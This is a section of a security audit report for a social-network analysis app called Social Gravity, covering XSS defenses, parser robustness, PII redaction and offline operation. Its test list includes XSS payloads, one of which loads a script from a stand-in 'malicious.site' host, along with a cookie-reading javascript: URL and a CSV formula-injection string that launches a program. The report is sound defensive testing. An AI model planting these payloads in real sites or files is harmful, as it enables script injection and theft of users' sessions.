3. TECHNICAL VULNERABILITY ANALYSIS
-----------------------------------
3.1 Cross-Site Scripting (XSS) Defenses:
- Tested Payloads:
  1. `<script>alert('pwned')</script>` in Agent Name and Bio
  2. `<img src="x" onerror="alert('xss')">` in Post Content
  3. `javascript:alert(document.cookie)` in Source URLs
  4. `<svg/onload=alert('svg')>` in Subreddit / Community tags
  5. `"><script src="//malicious.site/payload.js"></script>` in Metadata fields
  6. CSV formula injection: `=cmd|' /C calc'!A0` in tabular node exports
- Defenses Verified:
  * React JSX virtual DOM auto-escapes all string interpolations.
  * PDF report generator (`src/exports/pdfExporter.ts`) sanitizes dynamic content
    via regex entity replacement (`&`, `<`, `>`, `"`, `'`).
  * CSV export engine (`src/exports/csvExporter.ts`) prepends single quotes to any
    fields beginning with `=`, `+`, `-`, or `@` to prevent spreadsheet DDE code execution.

3.2 Input Validation & Denial-of-Service (DoS) Mitigation:
- Ingestion testing streamed a corrupted SNAP file containing 50,000 synthetic lines
  along with random null bytes (`\x00`), truncated rows, and negative node indices.
- Outcome:
  * Parser rejected malformed lines without throwing unhandled exceptions.
  * Memory consumption remained capped below 40 MB during intake.
  * Line parsing aborts early if input surpasses maximum supported graph thresholds.

3.3 PII Redaction & Data Sanitization:
- Analyst reports must not leak sensitive network identifiers or analyst workstation data.
- Built-in scrubbers were verified on raw text inputs:
  * IPv4 & IPv6 Addresses: Stripped and masked as `[REDACTED_IP]`.
  * Email Addresses: Pattern `[\w\.-]+@[\w\.-]+\.\w+` replaced with `[REDACTED_EMAIL]`.
  * Phone Numbers: Masked as `[REDACTED_PHONE]`.
- Output: Exported CSVs and PDF intelligence briefs contained zero raw PII strings.

3.4 Air-Gapped / Offline Operational Architecture:
- Social Gravity is explicitly designed for classified or air-gapped security enclaves.
- Network audit confirmed:
  * Local GoEmotions NLP runs entirely in browser/WASM memory with zero external API calls.
  * No Google Analytics, telemetry beacons, Sentry pings, or font CDNs are loaded.
  * Tauri configuration restricts all origin window communications (`dangerousDisableAssetCsp: false`).
